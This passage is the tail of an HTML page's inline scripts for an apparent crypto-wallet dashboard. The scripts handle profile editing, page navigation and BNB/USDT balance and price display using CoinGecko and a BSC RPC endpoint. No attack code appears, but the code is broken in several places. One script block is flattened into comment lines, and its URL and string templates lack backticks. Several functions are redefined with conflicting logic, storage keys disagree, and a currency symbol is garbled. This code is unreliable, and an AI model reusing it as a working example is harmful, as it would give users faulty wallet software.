  document.getElementById("saveBtn").style.display = enable ? "inline-block" : "none";

  if (enable) {
    // Pre-fill input fields with current profile data
    document.getElementById("editName").value = userProfile.name;
    document.getElementById("editEmail").value = userProfile.email;
    document.getElementById("editCountry").value = userProfile.country;
    document.getElementById("editPhone").value = userProfile.phone;
  }
}

function enableEdit() {
  toggleEdit(true);
  hideSaveMessage();
}

function hideSaveMessage() {
  document.getElementById("saveMessage").style.display = "none";
}

function showSaveMessage() {
  document.getElementById("saveMessage").style.display = "block";
}

function saveProfile() {
  // Get input values and basic validation
  const name = document.getElementById("editName").value.trim();
  const email = document.getElementById("editEmail").value.trim();
  const country = document.getElementById("editCountry").value.trim();
  const phone = document.getElementById("editPhone").value.trim();

  if (!name || !email || !country || !phone) {
    alert("Please fill in all profile fields.");
    return;
  }

  // TODO: Add email format validation if needed

  // Update userProfile data
  userProfile.name = name;
  userProfile.email = email;
  userProfile.country = country;
  userProfile.phone = phone;

  // Optionally save to localStorage or backend here
  // localStorage.setItem('userProfile', JSON.stringify(userProfile));

  // Reload profile display with updated info
  loadProfile();

  // Show confirmation message
  showSaveMessage();
}

// Initialize profile page when shown
function initProfilePage() {
  // If you store profile in localStorage, load it here
  // const storedProfile = localStorage.getItem('userProfile');
  // if (storedProfile) userProfile = JSON.parse(storedProfile);

  loadProfile();
}

// Call initProfilePage when page18 is shown
// e.g., modify your showPage() to call initProfilePage() when showing page18
</script>
  
 <script>
   // Show one page, hide others, and persist current page to localStorage
function showPage(pageId) {
  document.querySelectorAll('.page').forEach(page => {
    page.style.display = (page.id === pageId) ? 'block' : 'none';
  });
  localStorage.setItem('currentPage', pageId);
}

// On page load, restore last opened page or default to homepage 'page4'
document.addEventListener('DOMContentLoaded', () => {
  const savedPage = localStorage.getItem('currentPage') || 'page4';
  showPage(savedPage);
  loadWalletInfo();
  populateLanguageSelector();
  populateCurrencySelector();
});

// Example: Load wallet info from localStorage (simulate connected wallet)
function loadWalletInfo() {
  const walletAddress = localStorage.getItem('walletAddress');
  const displayEl = document.getElementById('walletAddress');
  const connectedWalletDisplay = document.getElementById('connectedWalletDisplayHomepage');
  if (walletAddress) {
    displayEl.textContent = shortenAddress(walletAddress);
    connectedWalletDisplay.textContent = 'Connected Wallet: ' + shortenAddress(walletAddress);
  } else {
    displayEl.textContent = '';
    connectedWalletDisplay.textContent = '';
  }
}

// Utility: Shorten long wallet addresses for display (e.g., 0xabc...123)
function shortenAddress(address) {
  if (!address) return '';
  return address.slice(0, 6) + '...' + address.slice(-4);
}

// Copy wallet address to clipboard
function copyWalletAddress() {
  const walletAddress = localStorage.getItem('walletAddress');
  if (!walletAddress) {
    alert('No wallet address to copy');
    return;
  }
  navigator.clipboard.writeText(walletAddress)
    .then(() => alert('Wallet address copied to clipboard!'))
    .catch(() => alert('Failed to copy address.'));
}

// Example functions to populate language and currency selectors
function populateLanguageSelector() {
  const selector = document.getElementById('languageSelector');
  if (!selector) return;
  // Add example languages
  const languages = [
    { code: 'en', name: 'English' },
    { code: 'fr', name: 'French' },
    { code: 'es', name: 'Spanish' },
  ];
  selector.innerHTML = languages.map(lang => 
    `<option value="${lang.code}">${lang.name}</option>`
  ).join('');
  selector.value = localStorage.getItem('selectedLanguage') || 'en';
}

function populateCurrencySelector() {
  const selector = document.getElementById('currencySelector');
  if (!selector) return;
  // Add example currencies
  const currencies = [
    { code: 'USD', symbol: '$' },
    { code: 'CAD', symbol: 'C$' },
    { code: 'EUR', symbol: '‚Ç¨' },
  ];
  selector.innerHTML = currencies.map(cur => 
    `<option value="${cur.code}">${cur.code}</option>`
  ).join('');
  selector.value = localStorage.getItem('selectedCurrency') || 'USD';
}

// Handle language change event
function handleLanguageChange() {
  const selector = document.getElementById('languageSelector');
  if (!selector) return;
  localStorage.setItem('selectedLanguage', selector.value);
  alert('Language changed to ' + selector.options[selector.selectedIndex].text);
  // You can add your translation logic here
}

// Handle currency change event
function handleCurrencyChange() {
  const selector = document.getElementById('currencySelector');
  if (!selector) return;
  localStorage.setItem('selectedCurrency', selector.value);
  alert('Currency changed to ' + selector.value);
  // You can update total assets display with conversion here
}

// Helper to open transfer page with token param
function openTransferPage(token) {
  // Save token param to localStorage or pass as needed
  localStorage.setItem('transferToken', token);
  showPage('page8'); // Assuming page8 is transfer page
}

// Connect wallet simulation (for testing)
function connectWalletSim() {
  const exampleAddress = '0xAbCDEF1234567890abcdef1234567890aBcDef12';
  localStorage.setItem('walletAddress', exampleAddress);
  loadWalletInfo();
  alert('Wallet connected: ' + shortenAddress(exampleAddress));
}

// Add event listeners to buttons (optional if using inline onclick)
document.addEventListener('DOMContentLoaded', () => {
  // Example: Add Fund button
  document.querySelector('button[onclick*="page6"]').addEventListener('click', () => showPage('page6'));
  // Transfer button
  document.querySelector('button[onclick*="page8"]').addEventListener('click', () => showPage('page8'));
  // Trade button
  document.querySelector('button[onclick*="page16"]').addEventListener('click', () => showPage('page16'));
  // Top Up BNB button
  document.querySelector('button[onclick*="page5"]').addEventListener('click', () => showPage('page5'));
  // Assets button
  document.querySelector('button[onclick*="page7"]').addEventListener('click', () => showPage('page7'));
});
  
  </script>
  <script>

    // === Page Memory Persistence === window.addEventListener('DOMContentLoaded', () => { const lastPage = localStorage.getItem("lastPage") || "page4"; showPage(lastPage); initCoinWidgets(); updateBalances(); renderPriceChart(); });

function showPage(id) { document.querySelectorAll(".page").forEach(p => p.style.display = "none"); const page = document.getElementById(id); if (page) page.style.display = "block"; localStorage.setItem("lastPage", id); }

function copyWalletAddress() { const wallet = document.getElementById("walletAddress").innerText; if (wallet) { navigator.clipboard.writeText(wallet); alert("Wallet address copied!"); } }

// === Coin Data Fetch === async function fetchCoinData() { const ids = ["binancecoin", "tether"]; const [priceRes, metaRes] = await Promise.all([ fetch(https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd), fetch(https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids.join(',')}) ]);

const priceData = await priceRes.json(); const metaData = await metaRes.json();

return { BNB: { price: priceData.binancecoin.usd, image: metaData.find(c => c.id === 'binancecoin').image }, USDT: { price: priceData.tether.usd, image: metaData.find(c => c.id === 'tether').image } }; }

async function initCoinWidgets() { const coin = await fetchCoinData(); document.getElementById("bnbIcon").src = coin.BNB.image; document.getElementById("usdtIcon").src = coin.USDT.image; document.getElementById("bnbBalance").innerText = BNB ($${coin.BNB.price.toFixed(2)}); document.getElementById("usdtBalance").innerText = USDT ($${coin.USDT.price.toFixed(2)}); }

// === Balance & Total Assets === async function updateBalances() { const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/"); const wallet = localStorage.getItem("connectedWallet"); if (!wallet) return;

const bnbBalance = await provider.getBalance(wallet); const usdtContract = new ethers.Contract( "0x55d398326f99059fF775485246999027B3197955", ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"], provider );

const [usdtRaw, usdtDecimals] = await Promise.all([ usdtContract.balanceOf(wallet), usdtContract.decimals() ]);

const bnb = parseFloat(ethers.formatEther(bnbBalance)); const usdt = parseFloat(ethers.formatUnits(usdtRaw, usdtDecimals));

const coin = await fetchCoinData(); const total = (bnb * coin.BNB.price + usdt * coin.USDT.price).toFixed(2);

document.getElementById("bnbTokenBalance").innerText = bnb.toFixed(4); document.getElementById("usdtTokenBalance").innerText = usdt.toFixed(2); document.getElementById("totalAssetsAmount").innerText = total; document.getElementById("walletAddress").innerText = wallet.slice(0, 6) + "..." + wallet.slice(-4); }

// === Chart Rendering === let chart; async function renderPriceChart() { const res = await fetch("https://api.coingecko.com/api/v3/coins/binancecoin/market_chart?vs_currency=usdt&days=1&interval=hourly"); const data = await res.json(); const prices = data.prices.map(p => ({ x: new Date(p[0]), y: p[1] }));

const ctx = document.getElementById("priceChart").getContext("2d"); if (chart) chart.destroy(); chart = new Chart(ctx, { type: "line", data: { datasets: [{ label: "BNB/USDT", data: prices, borderColor: "#f3ba2f", backgroundColor: "rgba(243,186,47,0.1)", borderWidth: 2, tension: 0.3 }] }, options: { scales: { x: { type: "time", time: { unit: "hour" }, grid: { color: "#333" }, ticks: { color: "#ccc" } }, y: { grid: { color: "#333" }, ticks: { color: "#ccc" } } }, plugins: { legend: { display: false }, tooltip: { mode: "index", intersect: false } } } }); }

 </script>
  <script>
async function fetchTopCoinData() {
  const ids = ['bitcoin', 'ethereum', 'solana', 'usd-coin', 'binance-usd'];
  const url = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids.join(',')}&order=market_cap_desc&per_page=5&page=1&sparkline=false`;

  const res = await fetch(url);
  const data = await res.json();
  return data; // contains name, symbol, image, current_price
}

async function renderTopCoins() {
  const coins = await fetchTopCoinData();
  const container = document.getElementById("topCoinList");
  container.innerHTML = ''; // Clear old

  coins.forEach(coin => {
    const row = document.createElement("div");
    row.style.display = "flex";
    row.style.justifyContent = "space-between";
    row.style.alignItems = "center";
    row.style.background = "#1f2630";
    row.style.color = "#fff";
    row.style.padding = "10px 16px";
    row.style.borderRadius = "10px";
    row.style.marginBottom = "10px";
    row.style.fontWeight = "bold";

    row.innerHTML = `
      <div style="display:flex; align-items:center; gap:12px;">
        <img src="${coin.image}" alt="${coin.name}" style="width:32px; height:32px; border-radius:50%;">
        <div>${coin.name} (${coin.symbol.toUpperCase()})</div>
      </div>
      <div style="color:#f3ba2f;">$${coin.current_price.toFixed(2)}</div>
    `;
    container.appendChild(row);
  });
}

window.addEventListener("DOMContentLoaded", () => {
  renderTopCoins();
});
  </script>
  <script>
  async function fetchCoinData(ids) {
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`;
    const res = await fetch(url);
    return res.ok ? res.json() : null;
  }

  async function fetchCoinInfo(id) {
    const url = `https://api.coingecko.com/api/v3/coins/${id}`;
    const res = await fetch(url);
    const data = await res.json();
    return { image: data.image.small };
  }

  async function updateBalances() {
    const ids = { bnb: 'binancecoin', usdt: 'tether' };

    const [{ image: bnbImg }, { image: usdtImg }] = await Promise.all([
      fetchCoinInfo(ids.bnb),
      fetchCoinInfo(ids.usdt),
    ]);

    document.getElementById('bnbIcon').src  = bnbImg;
    document.getElementById('usdtIcon').src = usdtImg;

    const prices = await fetchCoinData(Object.values(ids));
    document.getElementById('bnbBalance').innerText  = `BNB: $${prices[ids.bnb].usd}`;
    document.getElementById('usdtBalance').innerText = `USDT: $${prices[ids.usdt].usd}`;
  }

  updateBalances();
  setInterval(updateBalances, 60 * 1000); // refresh every minute
  </script>
</body>
</html>
    
  

